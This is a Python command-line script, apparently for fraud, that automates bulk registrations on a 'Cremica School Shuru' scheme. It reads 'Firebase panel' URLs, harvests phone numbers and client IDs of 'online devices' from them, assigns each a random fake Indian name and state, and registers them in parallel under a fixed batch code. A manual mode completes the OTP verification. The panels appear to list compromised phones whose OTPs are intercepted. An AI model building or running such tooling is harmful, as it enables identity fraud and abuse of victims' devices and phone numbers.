#!/usr/bin/env python3
"""
Cremica School Shuru Automation - Local CLI Runner.
Runs without Telegram bot directly in terminal.
"""

import sys
import os
import requests
import fcremica_core as core

def run_firebase_panels(input_source, is_single=False, workers=5, batch_code="CD06G26"):
    lines = []
    if os.path.exists(input_source):
        with open(input_source, "r", encoding="utf-8") as fh:
            lines = [line.strip() for line in fh if line.strip()]
    else:
        # Treat input_source as raw text or space/comma separated links
        lines = [line.strip() for line in input_source.replace(",", "\n").splitlines() if line.strip()]

    if is_single and len(lines) > 1:
        lines = lines[:1]  # Restrict to single link if single panel mode selected

    panel_urls = []
    for line in lines:
        parsed = core.parse_firebase_link(line)
        if parsed:
            panel_urls.append(parsed)
        else:
            print(f"  [WARN] Invalid Firebase URL: {line}")

    if not panel_urls:
        print("❌ No valid Firebase URLs found.")
        return

    mode_label = "Single Panel" if is_single else f"Bulk ({len(panel_urls)} Panels)"
    print(f"\n🔄 Processing {mode_label} with {workers} parallel worker(s)...")
    all_jobs = []
    for idx, fb_url in enumerate(panel_urls, 1):
        print(f"\nScanning Panel ({idx}/{len(panel_urls)}): {fb_url}")
        devices = core.fetch_devices_and_phones(fb_url)
        if not devices:
            print("  [WARN] No online devices with phone numbers found.")
            continue
        print(f"  Found {len(devices)} online device(s).")
        for dev in devices:
            phone = dev["phone"]
            name = core.random_indian_name()
            state = core.random_state()
            all_jobs.append((phone, name, state, fb_url, dev["client_id"]))

    if not all_jobs:
        print("⚠️ No online devices collected to process.")
        return

    print(f"\n⚡ Total collected devices: {len(all_jobs)}")
    print(f"Starting parallel execution engine with Batch Code: {batch_code}...")

    def progress_cli(completed, total, outcome):
        phone, name, state, result = outcome
        status_symbol = "✅" if result['status'] == 'success' else "❌"
        print(f"  [{completed}/{total}] {status_symbol} {phone} ({name}) -> {result['status']}: {result.get('details', '')}")

    total_success, results = core.process_numbers_parallel(
        all_jobs, batch_code, max_workers=workers, progress_callback=progress_cli
    )

    # Generate structured result file with SUCCESS list first, then FAILED list
    report_text = core.write_summary_report(results, batch_code=batch_code)

    print("\n" + "=" * 60)
    print(f"🎉 Execution Complete! Success: {total_success}/{len(all_jobs)}")
    print(f"📄 Detailed results saved to: {core.LOG_FILE}")
    print("=" * 60)
    print("\n" + report_text)


def run_manual_single(phone=None, batch_code="CD06G26"):
    if not phone:
        phone = input("\nEnter 10-digit mobile number: ").strip()
    
    clean_phone = "".join(filter(str.isdigit, phone))
    if len(clean_phone) > 10 and clean_phone.startswith("91"):
        clean_phone = clean_phone[2:]
        
    if len(clean_phone) != 10:
        print("❌ Invalid Indian mobile number!")
        return

    name = core.random_indian_name()
    state = core.random_state()
    print(f"\nInitiating registration for {clean_phone} ({name}, {state})...")

    session = requests.Session()
    results = []
    try:
        user_data = core.create_user(session)
        user_key = user_data["userKey"]
        data_key = user_data["dataKey"]

        core.track_click(user_key, data_key, session)
        core.register(user_key, data_key, name, clean_phone, session)
        print(f"✅ OTP sent successfully to {clean_phone}!")

        otp = input(f"Enter OTP received on {clean_phone}: ").strip()
        if not otp or len(otp) not in (4, 6):
            res = {"phone": clean_phone, "name": name, "state": state, "status": "otp_invalid", "details": "Manual OTP invalid"}
            results.append(res)
            core.write_summary_report(results, batch_code=batch_code)
            print("❌ Invalid OTP input!")
            return

        access_token = core.verify_otp(user_key, data_key, otp, session)
        core.get_batch_code(user_key, data_key, access_token, batch_code, state, session)
        
        res = {"phone": clean_phone, "name": name, "state": state, "status": "success", "details": "Manual CLI OTP verified"}
        results.append(res)
        core.log_result(clean_phone, name, state, batch_code, "success", "Manual CLI OTP verified")

        print("\n" + "=" * 60)
        print(f"🎉 SUCCESS! Registration validated for {clean_phone}")
        print("=" * 60)
    except Exception as e:
        res = {"phone": clean_phone, "name": name, "state": state, "status": "failed", "details": str(e)}
        results.append(res)
        print(f"❌ Error: {e}")
    finally:
        session.close()
        core.write_summary_report(results, batch_code=batch_code)
        print(f"📄 Results saved to: {core.LOG_FILE}")


def main():
    batch_code = "CD06G26"
    
    print("=" * 55)
    print("⚡ Cremica School Shuru Automation Engine (Local CLI)")
    print("=" * 55)

    if len(sys.argv) >= 2:
        arg = sys.argv[1]
        if arg == "--single":
            run_manual_single(batch_code=batch_code)
        else:
            run_firebase_panels(arg, is_single=False, batch_code=batch_code)
        return

    # Interactive menu options
    print("1. Single Panel (Process 1 Firebase Panel URL)")
    print("2. Bulk Panels (Process multiple Firebase URLs or panels.txt)")
    print("3. Manual Single Number (Process 1 number with manual OTP)")
    print("4. Exit")
    print("=" * 55)

    choice = input("Select an option (1-4): ").strip()
    if choice == "1":
        source = input("\nEnter Single Firebase Panel URL: ").strip()
        if source:
            run_firebase_panels(source, is_single=True, batch_code=batch_code)
    elif choice == "2":
        source = input("\nEnter Firebase URLs or path to panels.txt file: ").strip()
        if source:
            run_firebase_panels(source, is_single=False, batch_code=batch_code)
    elif choice == "3":
        run_manual_single(batch_code=batch_code)
    else:
        print("Exiting.")


if __name__ == "__main__":
    main()
